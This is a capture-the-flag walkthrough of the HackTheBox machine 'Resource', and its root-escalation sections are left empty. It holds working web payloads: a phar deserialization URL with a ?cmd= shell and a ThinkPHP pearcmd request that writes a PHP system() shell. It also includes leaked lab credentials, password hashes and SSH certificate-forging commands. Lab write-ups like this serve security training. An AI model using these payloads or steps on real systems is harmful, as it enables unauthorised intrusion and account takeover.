---
title: "Resource"
type: docs
prev: docs/cybersecurity/hackthebox
---

---
---
<script>
document.addEventListener('DOMContentLoaded', function() {
    var password = prompt("Enter the password to view the content:");
    if (password !== "1#ViewTheWalkthrough#1") {
        document.body.innerHTML = `
            <p>Here are a few hints:</p>
            <ul>
                <li>Shell Hint: PHP Deserialization + ZIP Files with data </li>
                <li>User Hint: SSH Signing </li>
                <li>Root Hint: SSH Globbing Leak </li>
            </ul>
            <p>Note: The box is still active. This information will be released publicly when it is no longer active.</p>
            <button onclick="window.location.href='/tech/cybersecurity'">Back to Cybersecurity</button>
        `;
        document.querySelector("button").style.cssText = "margin-top: 20px; padding: 10px 20px; font-size: 16px; border: 2px solid #808080; color: #808080; border-radius: 5px; cursor: pointer; background-color: transparent;";
    } else {
        document.getElementById("prePromptMessage").style.display = "block";
    }
});
</script>

Note that unfortunately the box seems to be broken for me rn and did not take tons of sccreenshots along the way since this was a competition (speed) box. I intend to resolve it when it is fixed but here are the commands I used:


## Enumeration
```
# Nmap 7.94SVN scan initiated Sat Aug  3 22:03:42 2024 as: nmap -T5 -sVC -A -o resourcefull resource.htb
Warning: 10.10.11.27 giving up on port because retransmission cap hit (2).
Nmap scan report for resource.htb (10.10.11.27)
Host is up (0.095s latency).
Not shown: 810 closed tcp ports (conn-refused), 187 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  3 22:04:02 2024 -- 1 IP address (1 host up) scanned in 19.66 seconds
```

We find that it directs to itrc.ssg.htb so we add to /etc/hosts.

On itrc we find that there is a webpage for which we can create an account and create tickets. We create an account and create a ticket. Interesting there is an upload that accepts zip files only. Additionally running a dirbust we see that there is an admin page we can access and view some interesting tickets that we can not access the deatils of, some of which may contain some deprecated but still functional SSH keys. One thought would be to visit the uploads directory (also found from fuzzing or observing ticket submission behavior) and see the uploaded content of the SSH-related tickets, unfortunately the upload files are SHA1 hashed so both guessing and brute-forcing this is not really an option in the time frame (although is an interesting potential vulnerability given a site that could handle an absurd number of requests 2^128 combinations). Another interesting path was that the comment section of a ticket had IDOR where one could successfully comment on another post, which would be useful if there were simulated users, but this was not the case. For the time being, these are all rabbit holes but the SSH key hints and uploads will be useful and accesible later.

## Foothold

### phar deserialization - Intended
Create a zip file with a php shell in it, I had some trouble getting a tcp reverse shell to work but the standard ?cmd= shell worked like a charm.

Upload the zip to a ticket. You will be able to view the hashed filename. Visit the uplods directory at your uploaded folder using the page navigation functionality and exploit a phar deserialization vulnerability (Phar files (PHP Archive) files contain meta data in serialized format, so, when parsed, this metadata is deserialized and you can try to abuse a deserialization vulnerability inside the PHP code. - Hacktricks https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization).

```
http://itrc.ssg.htb/?page=phar://uploads/hash.zip/shell&cmd=ls
```

Boom RCE.

### ThinkPHP Config Abuse Unintended 
https://github.com/Mr-xn/thinkphp_lang_RCE

"When ThinkPHP enables the multi-language feature, attackers can use language parameters and directory traversal to implement file inclusion, and then achieve remote code execution through file inclusion."

"After writing the file using pearcmd (PHP in the docker environment exists by default and has a fixed location), it contains [content of the exploit]"

Grab a normal index navigation from burp and send it to repeater. We edit the /GET to the following:

```GET /index.php?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?system($_GET['cmd']);?>+/var/www/itrc/uploads/shell.php```

We can now visit /uploads/shell.php and use the ?cmd= shell. I used this with url encoded payloads to download and execute a reverse shell.

## User Escalation

### Enumeration
We know from the dir bust and the functionality of the site that there is a db somewhere. Convinently the db.php file one directory up from the uploads directory where we landed has a username and password for us.

/static/images/hackthehebox/resource/db.creds

We use those creds to log into the db:

```
mysql -u jj -p -h db
```

Congrats, we enumerate these hashes:

```
$2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2                                                                          
$2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6                                                                          
$2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2                                                                         
$2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm                                                                          
$2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq                                                                         
$2y$10$dhWgauaX5rWlSMFBC1e2dedv0ePpBDtBOY7eVkcI2npSjsNt0hvB2                                                                         
$2y$10$VCZJdE/UWFmGMG7/vo725.jgvv1oyrqwYtAkKnlK91wT4zmLoeBpm                                                                         
$2y$10$DdSbELDiuxPH3Uvfqn/dlegaGQ3VtAOICyXGTVeoKNptdL8r90H7y
```

unfortunately these are pretty secure because of the iterations required per hash so cracking them is unrealistic to the point where its not the intended path.

One thing that is very nice howerver is that the directory in which we landed has ALL the uploads for tickets (generally recognizable by seeing your own test tickets there, especially if you spent a long time trying to some fun IDOR shenanigans). I found out from a friend who solved the box that you can just check the DB to see which zip file you should download - makes sense. Alternatively, look at the date of the zips and downlaod a few, and grep process them.  Grepping for password proves useful and we find:

```
"headersSize": 647,
          "bodySize": 37,
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "text": "user=msainristil&pass=82yards2closeit",
            "params": [
              {
                "name": "user",
                "value": "msainristil"
              },
              {
                "name": "pass",
                "value": "82yards2closeit"
              }
            ]
          }
```

Yay! User shell via ssh... or so you thought. We're not quite to user.txt yet.

### Sign-ing-s'back Alright!

The only thing in msainristil's home directory is

```
msainristil@itrc:~/decommission_old_ca$ ls
ca-itrc  ca-itrc.pub
```

We did see something about signing being trusted by all servers. Hmmmm. We also see the zzinter user in the /home directory, who is mentioned in the admin panel as the user that can partion AD users.

Lets try to sign a key with his identity.

```
ssh-keygen -t rsa -b 2048 -f keypair
ssh-keygen -s ca-itrc -I ca-itrc.pub -n zzinter keypair.pub
ssh -o CertificateFile=keypair-cert.pub -i keypair zzinter@ssg.htb
```
Boom. User.txt for real this time.

## Root Escalation

### SSH Glob Leak - Intended


### Docker Mount - Unintended